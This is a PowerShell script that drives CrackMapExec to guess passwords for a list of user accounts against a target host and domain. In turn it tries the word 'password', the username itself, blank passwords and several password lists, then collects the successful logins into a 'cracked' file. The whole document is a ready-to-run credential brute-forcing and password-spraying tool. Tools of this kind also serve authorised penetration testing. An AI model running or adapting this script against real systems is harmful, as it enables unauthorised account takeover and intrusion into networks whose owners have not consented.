$ProgressPreference = 'SilentlyContinue'	
   
# Input Switches
[CmdletBinding()]
Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Users list')]
    [string]$UserList,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Enter Domain')]
    [string]$Domain,
    
    [Parameter(Mandatory = $true,
    HelpMessage = 'Target IP')]
    [string]$Target,
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Custom Password list')]
    [string]$PassList     
)

# these are the variables to use in the script
$global:domain2=$Domain
$global:target2=$Target
$global:userlist2=$UserList
$global:passlist=$PassList

if (!$domain2) { 
# if no domain is given then set it to a '.' 
$global:domain2="."
}

if (!$userlist2) { 
$global:userlist2="users.txt"
}




function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  


####################################
# CrackMapExecWin
####################################
function cme-check-cracked {
Get-Content -Path .\cme_*.log | findstr [+] | sort-object| Get-Unique | Tee cme_cracked.txt
}

function cme-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p password >> cme_brute.log
}
Write-Output ""
cme-check-cracked
}
function cme-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p pass5.txt >> cme_brute.log
}

Write-Output ""
cme-check-cracked
}
function cme-userpass {
Write-Output ""
Write-Output "[+] user = pass"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p $user >> cme_brute.log
}

Write-Output ""
cme-check-cracked
}
function cme-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p pass_blank.txt >> cme_brute.log
}

Write-Output ""
cme-check-cracked
}
function cme-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p pass10.txt >> cme_brute.log
}

Write-Output ""
cme-check-cracked
}
function cme-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
.\crackmapexec.exe $target2 -d $domain2 -u $user -p pass100.txt >> cme_brute.log
}

Write-Output ""
cme-check-cracked


}


echo "" > cme_brute.log

debug

cme-password
cme-pass5
cme-userpass
cme-blank
cme-pass10
cme-pass100